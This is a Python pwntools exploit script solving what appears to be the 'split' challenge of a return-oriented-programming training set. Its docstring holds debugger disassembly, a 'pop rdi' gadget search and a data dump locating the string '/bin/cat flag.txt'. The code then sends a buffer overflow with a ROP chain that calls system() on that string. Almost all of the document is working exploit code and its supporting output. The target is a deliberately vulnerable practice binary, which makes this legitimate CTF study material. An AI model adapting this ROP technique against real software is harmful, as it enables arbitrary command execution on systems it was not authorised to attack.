#!/usr/bin/env python
"""
AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA found at offset: 40

gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000400746 <+0>: push   rbp
   0x0000000000400747 <+1>: mov    rbp,rsp
   0x000000000040074a <+4>: mov    rax,QWORD PTR [rip+0x20092f]        # 0x601080 <stdout@@GLIBC_2.2.5>
   0x0000000000400751 <+11>:    mov    ecx,0x0
   0x0000000000400756 <+16>:    mov    edx,0x2
   0x000000000040075b <+21>:    mov    esi,0x0
   0x0000000000400760 <+26>:    mov    rdi,rax
   0x0000000000400763 <+29>:    call   0x400630 <setvbuf@plt>
   0x0000000000400768 <+34>:    mov    rax,QWORD PTR [rip+0x200931]        # 0x6010a0 <stderr@@GLIBC_2.2.5>
   0x000000000040076f <+41>:    mov    ecx,0x0
   0x0000000000400774 <+46>:    mov    edx,0x2
   0x0000000000400779 <+51>:    mov    esi,0x0
   0x000000000040077e <+56>:    mov    rdi,rax
   0x0000000000400781 <+59>:    call   0x400630 <setvbuf@plt>
   0x0000000000400786 <+64>:    mov    edi,0x4008a8
   0x000000000040078b <+69>:    call   0x4005d0 <puts@plt>
   0x0000000000400790 <+74>:    mov    edi,0x4008be
   0x0000000000400795 <+79>:    call   0x4005d0 <puts@plt>
   0x000000000040079a <+84>:    mov    eax,0x0
   0x000000000040079f <+89>:    call   0x4007b5 <pwnme>
   0x00000000004007a4 <+94>:    mov    edi,0x4008c6
   0x00000000004007a9 <+99>:    call   0x4005d0 <puts@plt>
   0x00000000004007ae <+104>:   mov    eax,0x0
   0x00000000004007b3 <+109>:   pop    rbp
   0x00000000004007b4 <+110>:   ret    
End of assembler dump.
gdb-peda$ disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400807 <+0>: push   rbp
   0x0000000000400808 <+1>: mov    rbp,rsp
   0x000000000040080b <+4>: mov    edi,0x4008ff
   0x0000000000400810 <+9>: call   0x4005e0 <system@plt>
   0x0000000000400815 <+14>:    nop
   0x0000000000400816 <+15>:    pop    rbp
   0x0000000000400817 <+16>:    ret    
End of assembler dump.
gdb-peda$ disass pwnme
Dump of assembler code for function pwnme:
   0x00000000004007b5 <+0>: push   rbp
   0x00000000004007b6 <+1>: mov    rbp,rsp
   0x00000000004007b9 <+4>: sub    rsp,0x20
   0x00000000004007bd <+8>: lea    rax,[rbp-0x20]
   0x00000000004007c1 <+12>:    mov    edx,0x20
   0x00000000004007c6 <+17>:    mov    esi,0x0
   0x00000000004007cb <+22>:    mov    rdi,rax
   0x00000000004007ce <+25>:    call   0x400600 <memset@plt>
   0x00000000004007d3 <+30>:    mov    edi,0x4008d0
   0x00000000004007d8 <+35>:    call   0x4005d0 <puts@plt>
   0x00000000004007dd <+40>:    mov    edi,0x4008fc
   0x00000000004007e2 <+45>:    mov    eax,0x0
   0x00000000004007e7 <+50>:    call   0x4005f0 <printf@plt>
   0x00000000004007ec <+55>:    mov    rdx,QWORD PTR [rip+0x20089d]        # 0x601090 <stdin@@GLIBC_2.2.5>
   0x00000000004007f3 <+62>:    lea    rax,[rbp-0x20]
   0x00000000004007f7 <+66>:    mov    esi,0x60
   0x00000000004007fc <+71>:    mov    rdi,rax
   0x00000000004007ff <+74>:    call   0x400620 <fgets@plt>
   0x0000000000400804 <+79>:    nop
   0x0000000000400805 <+80>:    leave  
=> 0x0000000000400806 <+81>:    ret    
End of assembler dump.

# r2 split
[0x00400650]> /R pop rdi
  0x00400883                 5f  pop rdi
  0x00400884                 c3  ret

# objdump -s -j .data split

split:     file format elf64-x86-64

Contents of section .data:
 601050 00000000 00000000 00000000 00000000  ................
 601060 2f62696e 2f636174 20666c61 672e7478  /bin/cat flag.tx
 601070 74000000 00000000 0000               t.........   

"""


from pwn import *



payload = "\x90"*40 + p64(0x00400883) + p64(0x601060) + p64(0x0000000000400810)

p = process("./split")
# p = gdb.debug("./split", 'b *0x0000000000400810')
print p.recvuntil('data...')
print p.sendline(payload)
print p.recvline()
print p.recvline()
# print p.recvline()
